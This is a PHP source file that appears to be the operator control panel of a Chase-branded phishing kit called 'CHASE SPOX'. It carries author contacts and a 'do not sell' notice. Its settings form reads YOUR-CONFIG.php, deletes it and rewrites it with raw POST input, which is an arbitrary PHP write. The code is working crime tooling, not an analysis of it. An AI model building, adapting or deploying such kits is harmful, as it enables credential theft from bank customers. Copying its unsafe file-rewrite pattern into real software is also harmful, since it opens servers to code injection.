<?php
session_start();
error_reporting(0);
header("Content-Type: text/html; charset=UTF-8");
#################### *-* Start Include *-* ####################
if(!isset($_SESSION['UserData']['Username'])){header("location:login.php");exit;}else{ include 'YOUR-CONFIG.php';}

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * CHASE -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

?>

<!DOCTYPE html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>CHASE SPOX Login</title>

    <!-- Styling -->
<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600|Raleway:400,700" rel="stylesheet">
<link href="files/admin/css/all.min248f.css?v=b4c444" rel="stylesheet">
<link href="files/admin/css/fontawesome-all.min.css" rel="stylesheet">
<link href="files/admin/css/custom.css" rel="stylesheet">
<link rel="shortcut icon" href="files/admin/favicon.png">

<script src="https://kit.fontawesome.com/b7fa9575a5.js"></script>


</head>
<body data-phone-cc-input="1">



<section id="main-menu">

    <nav id="nav" class="navbar navbar-default navbar-main" role="navigation">
        <div class="container">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#primary-nav">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
            </div>

            <!-- Collect the nav links, forms, and other content for toggling -->
            <div class="collapse navbar-collapse" id="primary-nav">

                <ul class="nav navbar-nav">

<li menuitemname="Home" class="" id="Primary_Navbar-Home">
<a href="index.php">Home</a>
</li>
<li menuitemname="Services" class="dropdown" id="Primary_Navbar-Services">

<li menuitemname="Open Ticket" class="" id="Primary_Navbar-Open_Ticket">
<a href="setting.php">Config</a>
</li>
<li menuitemname="Affiliates" class="" id="Primary_Navbar-Affiliates">
<a href="info.php">info</a>
</li>
</ul>

<ul class="nav navbar-nav navbar-right">
<li menuitemname="Account" class="dropdown account" id="Secondary_Navbar-Account">
<a >Hello,<?php echo $yourname; ?> !&nbsp;</a>
</ul>
</li>
</ul>
</div><!-- /.navbar-collapse -->
</div>
</nav>
</section>



<section id="main-body">
<div class="container">
<div class="row">
<div class="col-md-9 pull-md-right">
<div class="header-lined">
<h1>Welcome Back, <?php echo $yourname; ?></h1>

</div>
</div>
<div class="col-md-3 pull-md-left sidebar">
<div menuitemname="Client Details" class="panel panel-sidebar panel-sidebar">
<div class="panel-heading">
<h3 class="panel-title">
<i class="fas fa-user"></i>&nbsp;Your Info
<i class="fas fa-chevron-up panel-minimise pull-right"></i>
</h3>
</div>
<div class="panel-body">
<strong>Hi.</strong><br><br>

<strong>Name: <a style="color:#f0ad4e">[ <?php echo $yourname; ?> ]</a></strong><br>
<strong>Page : <a style="color:#F08080">Chase Spox</a></strong><br>
<strong>Version : <a style="color:green;">V3</a></strong><br>
<strong>Date : <a style="color:#87CEFA;"><?php echo date("Y/m/d"); ?><a></strong><br><br><br>

<style>

</style>

</div>
<div class="panel-footer clearfix">
<a href="setting.php" class="btn btn-success btn-sm btn-block">
<i class="fas fa-pencil-alt"></i> Update
</a>
</div>
</div>
</div>
<?php

    $click = "YOUR-CONFIG.php";
    $fps = fopen($click, "r");
    $contents = fread($fps, filesize($click));
    fclose($fps);
    
    $domain = preg_replace('/www\./i', '', $_SERVER['SERVER_NAME']);

if(isset($_POST['noticeconfig'])) {
    
    $contents = str_replace($key,bin2hex(md5($_POST['domain'])),$contents);
    unlink("YOUR-CONFIG.php");
    $tulis = fopen("YOUR-CONFIG.php","a");
    fwrite($tulis,$_POST['noticeconfig']);
    fclose($tulis);
    echo "<script type='text/javascript'>alert('SPOX :) Successfully changed');window.top.location='?success';</script>";
    
}

?>
<div class="wrap-login100">
 <form action="" method="POST" class="">
                    <br><span style="margin-left:20px;"><b>Config: </b>&nbsp;&nbsp;&nbsp;</span><br>
                    <textarea name="noticeconfig" style="margin: 5px 0px 0px 20px; border-color: rgb(0, 0, 0); border-style: inset; border-width: 2px; height: 300px; width: 520px;" rows="20" cols="70%"><?php echo $contents; ?></textarea>
                    <br><br>
                    <div class="container-login100-form-btn">
                        <button style="margin-left:20px;" class="login100-form-btn">
                            Save
                        </button>&nbsp;&nbsp;<a style="text-decoration:none;color:#fff;" href="index.php?p=defaultconfig">
                    </div><br>
                </form></div>
                <style>
                    .login100-form-btn {
    display: -webkit-box;
    display: -webkit-flex;
    display: -moz-box;
    display: -ms-flexbox;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 0 20px;
    min-width: 160px;
    height: 35px;
    background-color: #57b846;
    border-radius: 3px;
    font-size: 12px;
    color: #fff;
    line-height: 1.5;
}
.wrap-login100 {
    width: 670px;
    background: #fff;
    border-radius: 10px;
    overflow: hidden;
    position: relative;
}
                </style>
<!-- /.main-content --></div>


</div>
</section>



</body>
</html>
